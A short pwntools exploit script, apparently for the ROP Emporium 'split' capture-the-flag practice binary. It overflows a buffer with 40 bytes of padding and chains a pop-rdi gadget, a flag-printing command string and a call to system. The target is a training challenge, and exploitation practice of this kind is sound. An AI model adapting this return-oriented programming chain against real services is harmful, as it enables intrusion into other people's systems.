#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

local = 1
if local:
	p = process('./split')
else:
	p = remote()

call_sys = 0x400810
cat_flag = 0x601060
pop_rdi_ret = 0x0000000000400883

gdb.attach(p, 'b 0x400804')

payload = cyclic(0x60)
payload = 'A' * 40 + p64(pop_rdi_ret) + p64(cat_flag) + p64(call_sys)
p.recvuntil('> ')
p.sendline(payload)

p.interactive()
